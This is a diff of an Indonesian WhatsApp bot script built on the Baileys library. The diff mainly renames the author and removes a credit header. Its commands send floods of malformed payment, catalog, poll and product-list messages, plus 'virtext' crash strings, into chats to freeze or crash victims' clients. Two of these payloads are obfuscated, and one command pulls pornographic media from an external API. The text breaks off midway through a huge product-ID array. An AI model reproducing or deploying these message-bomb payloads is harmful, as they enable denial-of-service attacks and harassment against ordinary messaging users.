@@ -1,16 +1,3 @@
-/*
-// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
-   Apalagi Lari Dari Tanggung Jawab
-
-// Base © 𝙃𝙒 𝙈𝙊𝘿𝙎 𝙒𝘼 Hw Mods : Copyan Dari Base Dika
-
-› Create By © 𝙃𝙒 𝙈𝙊𝘿𝙎 𝙒𝘼
-› Base Ori © 𝙃𝙒 𝙈𝙊𝘿𝙎 𝙒𝘼
-› Copyan Base Dika Hisoka Morou
-
-🌷 KALAU MAU RENAME TARO CREDITS GUA : © 𝙃𝙒 𝙈𝙊𝘿𝙎 𝙒𝘼 */
-
-//=================================================//
 require('./hwkal')
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
 const fs = require('fs')
@@ -313,7 +300,7 @@ switch(command) {
 case 'jaditroli': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -338,7 +325,7 @@ break
 case 'jadilokas': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -358,7 +345,7 @@ break
 case 'jadipolling': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -379,22 +366,22 @@ haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.
 }
 }
 break
-case 'jadikatalog': case 'zenkatalog': {
+case 'jadikatalog': case 'kiankatalog': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image/sticker'
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
-function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','ZENU\x20AIZAK\x20BOYS\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6289514100332','397419wzTxRp','6289514100332@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
+function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','kian\x20AIZAK\x20BOYS\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6289514100332','397419wzTxRp','6289514100332@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
 }
 }
 break
 case 'jadidocu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -419,7 +406,7 @@ break
 case 'jadidarknes': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -443,7 +430,7 @@ break
 case 'jadivirtext1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone}` }, { quoted: doc })
@@ -453,7 +440,7 @@ break
 case 'jadivirtext2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone1}` }, { quoted: doc })
@@ -463,7 +450,7 @@ break
 case 'jadivirtex3t': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone2}` }, { quoted: doc })
@@ -473,7 +460,7 @@ break
 case 'jadivirtext4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone3}` }, { quoted: doc })
@@ -483,7 +470,7 @@ break
 case 'jadivirtext5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone4}` }, { quoted: doc })
@@ -493,7 +480,7 @@ break
 case 'jadivirtext6': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone5}` }, { quoted: doc })
@@ -503,7 +490,7 @@ break
 case 'jadivirtext7': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone6}` }, { quoted: doc })
@@ -513,7 +500,7 @@ break
 case 'jadivirtext8': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${buttonkal}` }, { quoted: doc })
@@ -523,7 +510,7 @@ break
 case 'jadivirtext9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${buttonvirus}` }, { quoted: doc })
@@ -533,7 +520,7 @@ break
 case 'jadivirtext10': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted: doc })
@@ -543,7 +530,7 @@ break
 case 'jadibuginvite': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -564,7 +551,7 @@ break
 case 'jadibugpayment' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © 𝙕𝙚𝙣𝙪𝘼𝙞𝙯𝙖𝙠`,"body": `Selamat ${salam} kak ${pushname}`,
@@ -580,7 +567,7 @@ break
 case 'jadibugbokep': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
@@ -591,7 +578,7 @@ break
 case 'jadibugsw': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 joau = fs.readFileSync('./baseikal/video/haikal.mp4')
@@ -602,7 +589,7 @@ break
 case 'jadibugbutton':
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} zenu`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kian`)
 let teks = `${q}`
 for (let i of teks) {
 const buttonssk = [
@@ -622,12 +609,12 @@ haikal.sendMessage(m.chat, buttonnnnmMessage)
 //=================================================//
 //=================================================//
 //=================================================//
-case 'inibug': case 'zenjhon': {
+case 'inibug': case 'kianjhon': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
  ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
@@ -638,16 +625,16 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 }
 break
 //=================================================//
-case 'zenpoll': case 'zenjhon2': {
+case 'kianpoll': case 'kianjhon2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO 👋 SAYA BOT © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹",
+"name": "HALO 👋 SAYA BOT © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯",
 "options": [
 {
 "optionName": "KATANYA WA KEBAL"
@@ -662,7 +649,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 },
 {
-"optionName": "SALAM BROTHER BY © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹"
+"optionName": "SALAM BROTHER BY © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯"
 }
 ],
 "selectableOptionsCount": 5
@@ -673,7 +660,7 @@ deploy('sukses sendbug')}
 }
 break
 //=================================================//
-case 'zentroli2': case 'zentrol': case 'jutrol': {
+case 'kiantroli2': case 'kiantrol': case 'jutrol': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
@@ -698,18 +685,18 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
-case 'zentroli3': case 'zentrol2': {
+case 'kiantroli3': case 'kiantrol2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','ZENU\x20AIZAK\x20BOYS','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt','6289514100332@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await haikal[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var order=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+buttonkal,'description':_0x588892(0x1fc)+buttonkal,'thumbnail':virgam,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'produ